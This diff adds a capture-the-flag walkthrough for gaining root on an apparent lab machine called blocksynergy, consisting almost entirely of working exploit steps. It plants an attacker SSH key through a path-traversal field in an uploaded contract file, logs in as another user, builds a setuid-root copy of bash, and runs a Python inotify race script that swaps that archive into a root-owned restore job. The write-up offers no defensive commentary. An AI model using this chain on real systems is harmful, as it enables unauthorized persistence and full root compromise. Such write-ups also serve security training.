@@ -1,0 +1,189 @@
+## Root Flag — After Getting the Walter Shell
+
+After obtaining the **Walter shell**, follow the steps below.
+
+### 1. Generate an SSH Key in Your Normal Kali Terminal
+
+In your normal terminal, run:
+
+```bash
+rm -f /tmp/hank_key /tmp/hank_key.pub
+ssh-keygen -t rsa -b 4096 -f /tmp/hank_key -N "" -q
+
+echo "===== PUBLIC KEY (copy everything below) ====="
+cat /tmp/hank_key.pub
+```
+
+Copy the generated public key.
+
+### 2. Create the Pwn Contract
+
+After obtaining the public key, add it to the following contract:
+
+```bash
+cat > /tmp/pwn_contract.json << 'EOF'
+{
+  "name": "pwn",
+  "id": 1,
+  "owner": "Developer",
+  "logic": {
+    "claim": "allow"
+  },
+  "debug": "True",
+  "hooks": {
+    "on_claim": "log"
+  },
+  "__meta__": {
+    "log_file": "../../../../home/hank/.ssh/authorized_keys",
+    "log_content": {
+      "on_claim": "\nssh-rsa <PUBLIC_KEY_HERE>\n"
+    }
+  }
+}
+EOF
+```
+
+Replace `<PUBLIC_KEY_HERE>` with the public key generated in the previous step.
+
+Paste the contract into the **Walter shell**.
+
+### 3. Upload the Contract
+
+In the Walter shell, run:
+
+```bash
+curl -c /tmp/flask_cookies -b /tmp/flask_cookies \
+  -X POST http://127.0.0.1:5000/dashboard \
+  -F "action=upload_contract" \
+  -F "contract_file=@/tmp/pwn_contract.json"
+```
+
+### 4. Log in as Hank
+
+From your Kali terminal, run:
+
+```bash
+ssh -i /tmp/hank_key \
+  -o StrictHostKeyChecking=no \
+  -o PreferredAuthentications=publickey \
+  hank@blocksynergy.htb
+```
+
+If successful, the **Hank shell** should open:
+
+```text
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-138-generic x86_64)
+
+...
+
+hank@blocksynergy:~$
+```
+
+### 5. Create the SUID Archive
+
+From the Hank shell, run:
+
+```bash
+tar --owner=0 --group=0 --mode=4755 \
+  --transform='s|^bash$|opt/blocksynergy/.diag|' \
+  -czf /tmp/restore_suid.tar.gz \
+  -C /bin bash
+```
+
+Then verify that the archive was created:
+
+```bash
+ls -la /tmp/restore_suid.tar.gz
+```
+
+### 6. Monitor the Restore Directory
+
+Run the following Python script from the Hank shell:
+
+```bash
+python3 << 'EOF'
+import ctypes, os, struct, time, sys
+
+WATCH_DIR = "/var/restore_work"
+TARGET = "_opt_blocksynergy.tar.gz"
+MAL = "/tmp/restore_suid.tar.gz"
+TRIGGER = "/opt/blocksynergy/restore"
+
+IN_CREATE = 0x100
+IN_CLOSE_WRITE = 0x8
+IN_CLOSE_NOWRITE = 0x10
+IN_MOVED_TO = 0x80
+
+libc = ctypes.CDLL("libc.so.6")
+fd = libc.inotify_init1(0)
+libc.inotify_add_watch(
+    fd,
+    WATCH_DIR.encode(),
+    IN_CREATE | IN_CLOSE_WRITE | IN_CLOSE_NOWRITE | IN_MOVED_TO
+)
+
+try:
+    os.unlink(TRIGGER)
+except:
+    pass
+
+open(TRIGGER, "w").close()
+print("[+] Triggered restore")
+
+downloaded = False
+start = time.time()
+
+while time.time() - start < 120:
+    data = os.read(fd, 8192)
+    off = 0
+
+    while off + 16 <= len(data):
+        wd, mask, cookie, nlen = struct.unpack_from("iIII", data, off)
+        off += 16
+
+        name = data[off:off+nlen].split(b"\x00", 1)[0].decode(
+            errors="ignore"
+        )
+        off += nlen
+
+        if name != TARGET:
+            continue
+
+        if mask & (IN_CREATE | IN_MOVED_TO):
+            print("[+] Archive appeared:", name)
+
+        if mask & IN_CLOSE_WRITE:
+            print("[+] Download finished")
+            downloaded = True
+
+        if (mask & IN_CLOSE_NOWRITE) and downloaded:
+            print("[*] Swapping...")
+            os.replace(MAL, os.path.join(WATCH_DIR, TARGET))
+            print("[+] SWAP SUCCESS")
+            sys.exit(0)
+
+print("[-] Timeout - try again")
+EOF
+```
+
+### 7. Execute the SUID Binary
+
+Finally, verify that the binary exists:
+
+```bash
+ls -la /opt/blocksynergy/.diag
+```
+
+Then run:
+
+```bash
+/opt/blocksynergy/.diag -p -c "id"
+```
+
+If the SUID privilege escalation worked, you should have elevated privileges.
+
+Finally, read the root flag:
+
+```bash
+/opt/blocksynergy/.diag -p -c "cat /root/root.txt"
+```
